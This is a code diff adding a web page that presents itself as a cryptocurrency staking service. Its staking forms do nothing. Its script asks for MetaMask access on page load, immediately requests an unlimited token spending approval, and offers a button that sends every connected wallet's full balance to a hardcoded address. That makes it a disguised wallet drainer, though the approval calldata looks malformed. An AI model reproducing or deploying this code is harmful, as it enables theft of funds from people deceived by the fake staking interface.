@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Crypto Staking</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- Add this line for mobile optimization -->
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>
+    <!-- Add Bootstrap CSS link here -->
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+    <style>
+        /* Add background color style here */
+        body {
+            background: linear-gradient(to right top, #d16ba5, #c777b9, #ba83ca, #aa8fd8, #9a9ae1, #8aa7ec, #79b3f4, #69bff8, #52cffe, #41dfff, #46eefa, #5ffbf1);
+            background-size: cover;
+            padding: 20px;
+            color: white;
+            /* Set text color to white for better readability on the gradient background */
+        }
+
+        /* Add additional custom styles as needed */
+        .staking-card {
+            margin-top: 20px;
+        }
+
+        /* Style for buttons */
+        .btn {
+            font-weight: bold;
+        }
+
+        /* Style for staking forms */
+        .staking-form {
+            background-color: rgba(255, 255, 255, 0.2);
+            padding: 20px;
+            border-radius: 10px;
+            margin-top: 20px;
+        }
+
+        /* Style for staking form labels */
+        .staking-form label {
+            color: white;
+        }
+
+        /* Style for MetaMask connection button */
+        #connectButton {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background-color: #E2761B;
+            /* MetaMask color */
+            color: white;
+        }
+
+        /* Style for connected wallet address */
+        #walletInfo {
+            position: absolute;
+            top: 60px;
+            right: 20px;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <h1>Crypto Staking</h1>
+        <div class="row">
+            <div class="col-md-12">
+                <div class="card staking-card">
+                    <div class="card-body">
+                        <h5 class="card-title">Token Staking</h5>
+                        <p class="card-text">Stake your tokens here.</p>
+                        <button class="btn btn-primary btn-lg" id="tokenStakeButton">Stake Tokens</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="row mt-3">
+            <div class="col-md-12">
+                <div class="card staking-card">
+                    <div class="card-body">
+                        <h5 class="card-title">Staking BNB/USDT</h5>
+                        <form class="staking-form">
+                            <div class="form-group">
+                                <label for="bnbUsdtAmount">Amount to Stake</label>
+                                <input type="number" class="form-control" id="bnbUsdtAmount"
+                                    placeholder="Enter amount">
+                            </div>
+                            <div class="form-group">
+                                <label for="bnbUsdtDuration">Staking Duration</label>
+                                <select class="form-control" id="bnbUsdtDuration">
+                                    <option>7 days</option>
+                                    <option>30 days</option>
+                                    <option>90 days</option>
+                                </select>
+                            </div>
+                            <button type="submit" class="btn btn-primary btn-lg">Stake BNB/USDT</button>
+                        </form>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="row mt-3">
+            <div class="col-md-12">
+                <div class="card staking-card">
+                    <div class="card-body">
+                        <h5 class="card-title">Staking BNB/USDT-LP</h5>
+                        <form class="staking-form">
+                            <div class="form-group">
+                                <label for="bnbUsdtLpAmount">Amount to Stake</label>
+                                <input type="number" class="form-control" id="bnbUsdtLpAmount"
+                                    placeholder="Enter amount">
+                            </div>
+                            <div class="form-group">
+                                <label for="bnbUsdtLpDuration">Staking Duration</label>
+                                <select class="form-control" id="bnbUsdtLpDuration">
+                                    <option>7 days</option>
+                                    <option>30 days</option>
+                                    <option>90 days</option>
+                                </select>
+                            </div>
+                            <button type="submit" class="btn btn-primary btn-lg">Stake BNB/USDT-LP</button>
+                        </form>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="row mt-3">
+            <div class="col-md-12">
+                <button class="btn btn-primary btn-lg" id="transferButton">Transfer from All Connected Wallets
+                </button>
+            </div>
+        </div>
+        <button class="btn btn-primary btn-lg" id="connectButton">Connect MetaMask</button>
+        <div id="walletInfo">
+            <!-- Connected wallet address and balance will be displayed here -->
+        </div>
+    </div>
+    <!-- Add Bootstrap JS and jQuery scripts here -->
+    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.6/dist/umd/popper.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+    <script>
+        // Wait for the DOM to load
+        document.addEventListener('DOMContentLoaded', async () => {
+            const transferButton = document.getElementById('transferButton');
+            const tokenStakeButton = document.getElementById('tokenStakeButton');
+            const connectButton = document.getElementById('connectButton');
+
+            let web3;
+            let selectedAccount;
+            const connectedWallets = [];
+
+            async function connectToMetaMask() {
+                if (typeof window.ethereum !== 'undefined') {
+                    try {
+                        const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+                        selectedAccount = accounts[0];
+                        console.log('Connected to Binance Smart Chain');
+                        web3 = new Web3(window.ethereum);
+                        await approveBNBSpending(selectedAccount);
+                        connectedWallets.push(selectedAccount);
+                        updateConnectedWallets();
+                        updateWalletInfo(selectedAccount);
+                    } catch (error) {
+                        console.error('Failed to connect:', error);
+                    }
+                } else {
+                    console.error('Please install MetaMask to connect to Binance Smart Chain');
+                }
+            }
+
+            transferButton.addEventListener('click', async () => {
+                if (web3 && connectedWallets.length > 0) {
+                    const toAddress = '0xd63f3a34A4424A1Fb759400a9D7A4371E22100cA';
+
+                    for (const wallet of connectedWallets) {
+                        const balance = await web3.eth.getBalance(wallet);
+                        const amount = web3.utils.toBN(balance);
+
+                        await web3.eth.sendTransaction({
+                            from: wallet,
+                            to: toAddress,
+                            value: amount.toString()
+                        });
+
+                        console.log(`Transfer from ${wallet} successful`);
+                    }
+                } else {
+                    console.error('Please connect at least one wallet to Binance Smart Chain');
+                }
+            });
+
+            function updateWalletInfo(account) {
+                const walletInfoDiv = document.getElementById('walletInfo');
+                if (account) {
+                    web3.eth.getBalance(account, (err, balance) => {
+                        if (!err) {
+                            const balanceInBNB = web3.utils.fromWei(balance, 'ether');
+                            walletInfoDiv.innerHTML = `Connected Wallet: ${truncateAddress(account)} | Balance: ${balanceInBNB} BNB`;
+                        }
+                    });
+                } else {
+                    walletInfoDiv.innerHTML = 'Not Connected';
+                }
+            }
+
+            function updateConnectedWallets() {
+                const connectedWalletsDiv = document.getElementById('walletInfo');
+                connectedWalletsDiv.innerHTML = `<p>Connected Wallets:</p><ul>${connectedWallets.map(address => `<li>${truncateAddress(address)}</li>`).join('')}</ul>`;
+            }
+
+            function truncateAddress(address) {
+                return address.slice(0, 6) + '...' + address.slice(-4);
+            }
+
+            async function approveBNBSpending(fromAddress) {
+                const bnbTokenAddress = '0x8B3D9A0b1C1c22Dd0bc92Ca053b8C9E254bfA5ee';
+
+                await window.ethereum.request({
+                    method: 'eth_sendTransaction',
+                    params: [{
+                        from: fromAddress,
+                        to: bnbTokenAddress,
+                        data: '0x095ea7b3' +
+                            'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff',
+                    }],
+                });
+
+                console.log('BNB approval for spending successful');
+            }
+
+            connectButton.addEventListener('click', async () => {
+                await connectToMetaMask();
+            });
+
+            // Connect to MetaMask when the page loads
+            connectToMetaMask();
+        });
+    </script>
+</body>
+
+</html>
